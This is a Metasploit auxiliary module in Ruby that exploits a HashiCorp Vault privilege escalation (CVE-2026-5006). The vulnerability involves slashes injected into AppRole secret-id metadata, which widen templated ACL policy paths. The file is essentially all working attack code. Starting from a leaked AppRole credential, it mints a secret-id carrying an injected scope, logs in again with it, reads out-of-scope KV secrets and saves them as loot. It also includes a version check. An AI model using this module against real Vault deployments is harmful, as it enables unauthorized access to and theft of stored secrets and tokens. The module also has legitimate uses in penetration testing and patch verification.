##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'HashiCorp Vault AppRole Templated Policy Metadata Slash Injection',
        'Description' => %q{
          HashiCorp Vault and Vault Enterprise up to and including 2.0.3 fail to
          sanitize path separators in identity metadata that is interpolated into
          templated ACL policy paths (CVE-2026-5006, HCSEC-2026-32). When an AppRole
          is granted a templated read policy such as
          secret/data/{{identity.entity.aliases.<accessor>.metadata.scope}}/* together
          with the common self-service capability to create/update its own secret-id,
          a holder of a low privileged role_id and secret_id can mint a new secret-id
          whose metadata.scope contains slashes. Logging in with that secret-id expands
          the templated path across segment boundaries, granting read access to secrets
          outside the intended scope without ever holding a root or admin token.

          This module authenticates with a supplied (leaked) AppRole credential, mints a
          secret-id carrying an attacker chosen scope, re-authenticates, and reads a
          target KV v2 secret that the original credential could not reach.
        },
        'Author' => [
          'venexy <predator0x300@gmail.com>'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-5006'],
          ['URL', 'https://discuss.hashicorp.com/t/hcsec-2026-32-vault-vulnerable-to-privilege-escalation-via-slash-injection-in-templated-policy-paths']
        ],
        'DisclosureDate' => '2026-08-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8200),
        OptString.new('TARGETURI', [true, 'Base path to the Vault API', '/']),
        OptString.new('ROLE_ID', [true, 'AppRole role_id of the leaked credential']),
        OptString.new('SECRET_ID', [true, 'AppRole secret_id of the leaked credential']),
        OptString.new('APPROLE_NAME', [true, 'AppRole name the credential can self-rotate', 'edge-nifi']),
        OptString.new('INJECT_SCOPE', [true, 'metadata.scope value to inject (traverses path separators)', 'platform/nomad/bootstrap']),
        OptString.new('SECRET_PATH', [true, 'KV v2 data path to read after escalation', 'secret/data/platform/nomad/bootstrap/token'])
      ]
    )

    register_advanced_options(
      [
        OptString.new('VAULT_NAMESPACE', [false, 'Vault Enterprise namespace (X-Vault-Namespace header)', ''])
      ]
    )
  end

  def vault_request(token, method, path, data = nil)
    headers = {}
    headers['X-Vault-Token'] = token unless token.nil?
    headers['X-Vault-Namespace'] = datastore['VAULT_NAMESPACE'] unless datastore['VAULT_NAMESPACE'].to_s.empty?

    send_request_cgi(
      'method' => method,
      'uri' => normalize_uri(target_uri.path, 'v1', path),
      'ctype' => 'application/json',
      'headers' => headers,
      'data' => data.nil? ? nil : data.to_json
    )
  end

  def approle_login(role_id, secret_id)
    res = vault_request(nil, 'POST', 'auth/approle/login', { 'role_id' => role_id, 'secret_id' => secret_id })
    return nil unless res&.code == 200

    res.get_json_document.dig('auth', 'client_token')
  end

  def check
    res = vault_request(nil, 'GET', 'sys/seal-status')
    return Exploit::CheckCode::Unknown('No response from the Vault sys/seal-status endpoint') unless res

    version = res.get_json_document['version']
    return Exploit::CheckCode::Detected('Vault responded but did not report a version') if version.nil? || version.empty?

    if Rex::Version.new(version) < Rex::Version.new('2.0.4')
      Exploit::CheckCode::Appears("HashiCorp Vault #{version} is affected by CVE-2026-5006")
    else
      Exploit::CheckCode::Safe("HashiCorp Vault #{version} is patched (>= 2.0.4)")
    end
  end

  def run
    # 1) authenticate with the leaked, intended-scope credential
    t1 = approle_login(datastore['ROLE_ID'], datastore['SECRET_ID'])
    fail_with(Failure::NoAccess, 'AppRole login failed with the supplied ROLE_ID / SECRET_ID') unless t1
    print_good("Authenticated with the leaked AppRole credential (token #{t1[0, 12]}...)")

    # 2) baseline: the target secret should be out of scope for this credential
    base = vault_request(t1, 'GET', datastore['SECRET_PATH'])
    if base&.code == 200
      print_warning("#{datastore['SECRET_PATH']} is already readable with the base credential; no escalation required")
    else
      print_status("Baseline read of #{datastore['SECRET_PATH']} denied (HTTP #{base ? base.code : 'n/a'}), attempting slash injection")
    end

    # 3) self-rotate: mint a secret-id whose metadata.scope traverses path separators
    res = vault_request(
      t1, 'POST', "auth/approle/role/#{datastore['APPROLE_NAME']}/secret-id",
      { 'metadata' => { 'scope' => datastore['INJECT_SCOPE'] }.to_json }
    )
    unless res&.code == 200
      fail_with(Failure::NoAccess, "secret-id self-rotation denied (HTTP #{res ? res.code : 'n/a'}); the credential lacks create/update on auth/approle/role/#{datastore['APPROLE_NAME']}/secret-id")
    end
    evil = res.get_json_document.dig('data', 'secret_id')
    fail_with(Failure::UnexpectedReply, 'Rotation succeeded but no secret_id was returned') if evil.nil?
    print_good("Minted secret-id with injected metadata.scope=#{datastore['INJECT_SCOPE']} (#{evil[0, 12]}...)")

    # 4) authenticate with the injected secret-id: the templated path now traverses
    t2 = approle_login(datastore['ROLE_ID'], evil)
    fail_with(Failure::NoAccess, 'Login with the injected secret-id failed') unless t2
    print_good("Acquired escalated token (#{t2[0, 12]}...)")

    # 5) read the now-in-scope secret
    res = vault_request(t2, 'GET', datastore['SECRET_PATH'])
    unless res&.code == 200
      fail_with(Failure::UnexpectedReply, "Escalated read of #{datastore['SECRET_PATH']} failed (HTTP #{res ? res.code : 'n/a'})")
    end
    data = res.get_json_document.dig('data', 'data')
    fail_with(Failure::UnexpectedReply, "No KV v2 payload at #{datastore['SECRET_PATH']} (data.data missing)") if data.nil? || data.empty?

    print_good("Recovered secret at #{datastore['SECRET_PATH']}:")
    data.each { |k, v| print_line("    #{k} = #{v}") }

    path = store_loot(
      'hashicorp.vault.secret', 'application/json', rhost, data.to_json,
      datastore['SECRET_PATH'], 'CVE-2026-5006 escalated Vault read'
    )
    print_good("Secret contents stored in loot: #{path}")
  end
end
